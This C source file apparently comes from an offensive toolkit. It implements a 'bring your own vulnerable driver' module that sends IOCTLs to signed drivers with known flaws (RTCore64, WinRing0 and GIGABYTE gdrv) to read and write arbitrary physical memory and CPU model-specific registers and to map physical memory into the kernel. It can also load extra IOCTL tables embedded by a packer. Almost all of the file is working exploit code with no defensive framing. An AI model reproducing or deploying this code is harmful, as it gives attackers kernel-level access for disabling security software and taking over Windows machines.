/*
 * Driver Interaction Module
 *
 * Provides two complementary ways to invoke driver primitives:
 *
 *   1. Static profile table  – built-in IOCTL layouts for RTCore64,
 *      WinRing0/WinRing0x64, and gdrv.  No manifest required.
 *
 *   2. Dynamic .jmani manifest  – the binary table embedded at build time
 *      by "jockyc --manifest <file>".  Any primitive name → IOCTL code.
 *
 * High-level wrappers (jocky_driver_read_phys etc.) try the static table
 * first, then fall back to the manifest.
 *
 * .jmani section layout (written by packer.cpp embedManifest):
 *   [4]  magic    "JMNI"
 *   [4]  version  0x00000001
 *   [4]  count    number of entries
 *   Per entry:
 *     [1]  name_len
 *     [N]  name (no null terminator)
 *     [4]  ioctl    control code
 *     [2]  in_size  expected input  bytes (0 = variable / caller supplies)
 *     [2]  out_size expected output bytes (0 = variable / caller supplies)
 *
 * Windows only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>

/* ── .jmani manifest cache ──────────────────────────────────────────── */

#define JMANI_MAX_ENTRIES 128
#define JMANI_NAME_MAX    64

static const uint8_t JMANI_MAGIC[4] = {'J','M','N','I'};

typedef struct {
    char     name[JMANI_NAME_MAX];
    uint32_t ioctl;
    uint16_t in_size;
    uint16_t out_size;
} jmani_entry_t;

static jmani_entry_t s_manifest[JMANI_MAX_ENTRIES];
static int           s_manifest_count = 0;
static bool          s_manifest_loaded = false;

/* ── Internal PE section helper ─────────────────────────────────────── */

static uint8_t* find_section(const char* section_name, uint32_t* out_size)
{
    BYTE* base = (BYTE*)GetModuleHandleA(NULL);
    if (!base) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    size_t name_len = strlen(section_name);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)sec[i].Name, section_name, name_len) == 0) {
            if (out_size) *out_size = sec[i].Misc.VirtualSize;
            return base + sec[i].VirtualAddress;
        }
    }
    return NULL;
}

/* ── Manifest loading ───────────────────────────────────────────────── */

bool jocky_manifest_load(void)
{
    if (s_manifest_loaded) return s_manifest_count > 0;

    uint32_t sec_size = 0;
    uint8_t* sec = find_section(".jmani", &sec_size);
    if (!sec || sec_size < 12) {
        s_manifest_loaded = true; /* no section – not an error, just empty */
        return false;
    }

    if (memcmp(sec, JMANI_MAGIC, 4) != 0) {
        s_manifest_loaded = true;
        return false;
    }

    /* version field at [4..7] – reserved, not checked yet */
    uint32_t count = *(uint32_t*)(sec + 8);

    const uint8_t* p   = sec + 12;
    const uint8_t* end = sec + sec_size;
    s_manifest_count = 0;

    for (uint32_t i = 0; i < count && s_manifest_count < JMANI_MAX_ENTRIES; i++) {
        if (p + 1 > end) break;
        uint8_t name_len = *p++;
        if (p + name_len + 8 > end) break;

        jmani_entry_t* e = &s_manifest[s_manifest_count++];
        uint8_t copy_len = (name_len < JMANI_NAME_MAX - 1) ? name_len
                                                            : JMANI_NAME_MAX - 1;
        memcpy(e->name, p, copy_len);
        e->name[copy_len] = '\0';
        p += name_len;

        e->ioctl    = *(uint32_t*)p; p += 4;
        e->in_size  = *(uint16_t*)p; p += 2;
        e->out_size = *(uint16_t*)p; p += 2;
    }

    s_manifest_loaded = true;
    return s_manifest_count > 0;
}

/* Find a manifest entry by name; NULL if not found. */
static const jmani_entry_t* manifest_find(const char* name)
{
    if (!s_manifest_loaded) jocky_manifest_load();
    for (int i = 0; i < s_manifest_count; i++) {
        if (strcmp(s_manifest[i].name, name) == 0)
            return &s_manifest[i];
    }
    return NULL;
}

/* ── Static driver profile table ────────────────────────────────────── */

/*
 * RTCore64 (MSI Afterburner)
 * Device: \\.\RTCore64
 * Read  phys: IOCTL 0x80002048  – reads 1 byte at a time
 * Write phys: IOCTL 0x8000204C  – writes 1 byte at a time
 */

#pragma pack(push, 1)
typedef struct { uint32_t pad0; uint32_t pad1; uint64_t addr; uint32_t sz; } rtcore_rw_hdr_t;
typedef struct { uint32_t pad0; uint32_t pad1; uint64_t addr; uint32_t sz; uint8_t val; } rtcore_wr_t;
#pragma pack(pop)

#define RTCORE_IOCTL_READ  0x80002048u
#define RTCORE_IOCTL_WRITE 0x8000204Cu

static bool rtcore_read_phys(HANDLE dev, uint64_t addr, void* out, uint32_t size)
{
    uint8_t* dst = (uint8_t*)out;
    /* RTCore64 returns the byte appended after the header in the same buffer */
    uint8_t buf[sizeof(rtcore_rw_hdr_t) + 1];
    for (uint32_t i = 0; i < size; i++) {
        memset(buf, 0, sizeof(buf));
        rtcore_rw_hdr_t* hdr = (rtcore_rw_hdr_t*)buf;
        hdr->addr = addr + i;
        hdr->sz   = 1;
        DWORD bytes = 0;
        if (!DeviceIoControl(dev, RTCORE_IOCTL_READ,
                             buf, (DWORD)sizeof(buf),
                             buf, (DWORD)sizeof(buf),
                             &bytes, NULL))
            return false;
        dst[i] = buf[sizeof(rtcore_rw_hdr_t)];
    }
    return true;
}

static bool rtcore_write_phys(HANDLE dev, uint64_t addr, const void* in, uint32_t size)
{
    const uint8_t* src = (const uint8_t*)in;
    for (uint32_t i = 0; i < size; i++) {
        rtcore_wr_t req;
        memset(&req, 0, sizeof(req));
        req.addr = addr + i;
        req.sz   = 1;
        req.val  = src[i];
        DWORD bytes = 0;
        if (!DeviceIoControl(dev, RTCORE_IOCTL_WRITE,
                             &req, (DWORD)sizeof(req),
                             NULL, 0, &bytes, NULL))
            return false;
    }
    return true;
}

/*
 * WinRing0 / WinRing0x64 (CPU-Z, HWiNFO, …)
 * Device: \\.\WinRing0_1_2_0  (or \\.\WinRing0x64_1_2_0)
 * Read  phys:  IOCTL 0x9C402584  – block read via MmMapIoSpace
 * Write phys:  IOCTL 0x9C402588  – 1 byte at a time
 * Read  MSR:   IOCTL 0x9C40258C
 * Write MSR:   IOCTL 0x9C402590
 */

#pragma pack(push, 1)
typedef struct { uint32_t size; uint64_t phys_addr; }             wr0_read_req_t;
typedef struct { uint32_t size; uint64_t phys_addr; uint8_t val; } wr0_write_req_t;
typedef struct { uint32_t msr; }                                   wr0_msr_read_req_t;
typedef struct { uint32_t msr; uint64_t val; }                     wr0_msr_write_req_t;
#pragma pack(pop)

#define WR0_IOCTL_READ_PHYS  0x9C402584u
#define WR0_IOCTL_WRITE_PHYS 0x9C402588u
#define WR0_IOCTL_READ_MSR   0x9C40258Cu
#define WR0_IOCTL_WRITE_MSR  0x9C402590u

static bool winring0_read_phys(HANDLE dev, uint64_t addr, void* out, uint32_t size)
{
    wr0_read_req_t req;
    req.size      = size;
    req.phys_addr = addr;
    DWORD bytes = 0;
    return DeviceIoControl(dev, WR0_IOCTL_READ_PHYS,
                           &req, (DWORD)sizeof(req),
                           out,  size,
                           &bytes, NULL) && bytes == size;
}

static bool winring0_write_phys(HANDLE dev, uint64_t addr, const void* in, uint32_t size)
{
    const uint8_t* src = (const uint8_t*)in;
    for (uint32_t i = 0; i < size; i++) {
        wr0_write_req_t req;
        req.size      = 1;
        req.phys_addr = addr + i;
        req.val       = src[i];
        DWORD bytes = 0;
        if (!DeviceIoControl(dev, WR0_IOCTL_WRITE_PHYS,
                             &req, (DWORD)sizeof(req),
                             NULL, 0, &bytes, NULL))
            return false;
    }
    return true;
}

static bool winring0_read_msr(HANDLE dev, uint32_t msr, uint64_t* out)
{
    wr0_msr_read_req_t req = { msr };
    DWORD bytes = 0;
    return DeviceIoControl(dev, WR0_IOCTL_READ_MSR,
                           &req, (DWORD)sizeof(req),
                           out,  (DWORD)sizeof(*out),
                           &bytes, NULL) && bytes == 8;
}

static bool winring0_write_msr(HANDLE dev, uint32_t msr, uint64_t val)
{
    wr0_msr_write_req_t req;
    req.msr = msr;
    req.val = val;
    DWORD bytes = 0;
    return DeviceIoControl(dev, WR0_IOCTL_WRITE_MSR,
                           &req, (DWORD)sizeof(req),
                           NULL, 0, &bytes, NULL) != 0;
}

/*
 * gdrv (GIGABYTE)
 * Device: \\.\GIO
 * Map phys: IOCTL 0xC3502808  – MmMapIoSpace, returns kernel VA
 */

#pragma pack(push, 1)
typedef struct { uint32_t size; uint64_t phys_addr; } gdrv_map_req_t;
#pragma pack(pop)

#define GDRV_IOCTL_MAP_PHYS 0xC3502808u

static bool gdrv_read_phys(HANDLE dev, uint64_t addr, void* out, uint32_t size)
{
    /* gdrv exposes a map primitive, not a direct read.  Map, copy, no unmap. */
    gdrv_map_req_t req;
    req.size      = size;
    req.phys_addr = addr;
    uintptr_t mapped_va = 0;
    DWORD bytes = 0;
    if (!DeviceIoControl(dev, GDRV_IOCTL_MAP_PHYS,
                         &req, (DWORD)sizeof(req),
                         &mapped_va, (DWORD)sizeof(mapped_va),
                         &bytes, NULL) || !mapped_va)
        return false;
    memcpy(out, (void*)mapped_va, size);
    return true;
}

static bool gdrv_map_phys(HANDLE dev, uint64_t addr, uint32_t size,
                           uintptr_t* out_va)
{
    gdrv_map_req_t req;
    req.size      = size;
    req.phys_addr = addr;
    DWORD bytes = 0;
    if (!DeviceIoControl(dev, GDRV_IOCTL_MAP_PHYS,
                         &req, (DWORD)sizeof(req),
                         out_va, (DWORD)sizeof(*out_va),
                         &bytes, NULL))
        return false;
    return *out_va != 0;
}

/* ── Profile table ──────────────────────────────────────────────────── */

typedef bool (*drv_read_phys_fn) (HANDLE, uint64_t, void*,       uint32_t);
typedef bool (*drv_write_phys_fn)(HANDLE, uint64_t, const void*, uint32_t);
typedef bool (*drv_read_msr_fn)  (HANDLE, uint32_t, uint64_t*);
typedef bool (*drv_write_msr_fn) (HANDLE, uint32_t, uint64_t);
typedef bool (*drv_map_phys_fn)  (HANDLE, uint64_t, uint32_t, uintptr_t*);

typedef struct {
    const char*       name;        /* matches ctx->service_name (case-sensitive) */
    drv_read_phys_fn  read_phys;
    drv_write_phys_fn write_phys;
    drv_read_msr_fn   read_msr;
    drv_write_msr_fn  write_msr;
    drv_map_phys_fn   map_phys;
} driver_profile_t;

static const driver_profile_t s_profiles[] = {
    { "RTCore64",
      rtcore_read_phys,   rtcore_write_phys,   NULL,              NULL,              NULL        },
    { "WinRing0",
      winring0_read_phys, winring0_write_phys, winring0_read_msr, winring0_write_msr, NULL       },
    { "WinRing0x64",
      winring0_read_phys, winring0_write_phys, winring0_read_msr, winring0_write_msr, NULL       },
    { "gdrv",
      gdrv_read_phys,     NULL,                NULL,              NULL,               gdrv_map_phys },
    { NULL, NULL, NULL, NULL, NULL, NULL }  /* sentinel */
};

static const driver_profile_t* profile_lookup(const char* service_name)
{
    for (int i = 0; s_profiles[i].name; i++) {
        if (strcmp(s_profiles[i].name, service_name) == 0)
            return &s_profiles[i];
    }
    return NULL;
}

/* ── Manifest-backed generic invoke ────────────────────────────────── */

bool jocky_driver_invoke(jocky_byovd_t* ctx, const char* primitive,
                         const void* in_buf,  uint32_t in_size,
                         void*       out_buf, uint32_t out_size)
{
    if (!ctx || ctx->device == INVALID_HANDLE_VALUE || !primitive)
        return false;

    const jmani_entry_t* e = manifest_find(primitive);
    if (!e) return false;

    DWORD bytes = 0;
    return DeviceIoControl(ctx->device, e->ioctl,
                           (LPVOID)in_buf, in_size,
                           out_buf, out_size,
                           &bytes, NULL) != 0;
}

/* ── High-level primitives ──────────────────────────────────────────── */

bool jocky_driver_read_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                             void* out, uint32_t size)
{
    if (!ctx || ctx->device == INVALID_HANDLE_VALUE || !out || !size)
        return false;

    const driver_profile_t* p = profile_lookup(ctx->service_name);
    if (p && p->read_phys)
        return p->read_phys(ctx->device, phys_addr, out, size);

    /* Fall back: build a generic buffer and call the manifest */
    uint8_t req[12];
    *(uint32_t*)(req + 0) = size;
    *(uint64_t*)(req + 4) = phys_addr;
    return jocky_driver_invoke(ctx, "read_phys", req, sizeof(req), out, size);
}

bool jocky_driver_write_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                              const void* in, uint32_t size)
{
    if (!ctx || ctx->device == INVALID_HANDLE_VALUE || !in || !size)
        return false;

    const driver_profile_t* p = profile_lookup(ctx->service_name);
    if (p && p->write_phys)
        return p->write_phys(ctx->device, phys_addr, in, size);

    /* Fall back: size|phys_addr|data in a single heap buffer */
    uint32_t req_sz = 12 + size;
    uint8_t* req    = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, req_sz);
    if (!req) return false;
    *(uint32_t*)(req + 0) = size;
    *(uint64_t*)(req + 4) = phys_addr;
    memcpy(req + 12, in, size);
    bool ok = jocky_driver_invoke(ctx, "write_phys", req, req_sz, NULL, 0);
    HeapFree(GetProcessHeap(), 0, req);
    return ok;
}

bool jocky_driver_read_msr(jocky_byovd_t* ctx, uint32_t msr_id, uint64_t* out)
{
    if (!ctx || ctx->device == INVALID_HANDLE_VALUE || !out)
        return false;

    const driver_profile_t* p = profile_lookup(ctx->service_name);
    if (p && p->read_msr)
        return p->read_msr(ctx->device, msr_id, out);

    return jocky_driver_invoke(ctx, "read_msr",
                               &msr_id, sizeof(msr_id),
                               out,     sizeof(*out));
}

bool jocky_driver_write_msr(jocky_byovd_t* ctx, uint32_t msr_id, uint64_t val)
{
    if (!ctx || ctx->device == INVALID_HANDLE_VALUE)
        return false;

    const driver_profile_t* p = profile_lookup(ctx->service_name);
    if (p && p->write_msr)
        return p->write_msr(ctx->device, msr_id, val);

    uint8_t req[12];
    *(uint32_t*)(req + 0) = msr_id;
    *(uint64_t*)(req + 4) = val;
    return jocky_driver_invoke(ctx, "write_msr", req, sizeof(req), NULL, 0);
}

bool jocky_driver_map_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                            uint32_t size, uintptr_t* out_va)
{
    if (!ctx || ctx->device == INVALID_HANDLE_VALUE || !out_va)
        return false;

    const driver_profile_t* p = profile_lookup(ctx->service_name);
    if (p && p->map_phys)
        return p->map_phys(ctx->device, phys_addr, size, out_va);

    uint8_t req[12];
    *(uint32_t*)(req + 0) = size;
    *(uint64_t*)(req + 4) = phys_addr;
    return jocky_driver_invoke(ctx, "map_phys",
                               req, sizeof(req),
                               out_va, sizeof(*out_va));
}

#endif /* _WIN32 */
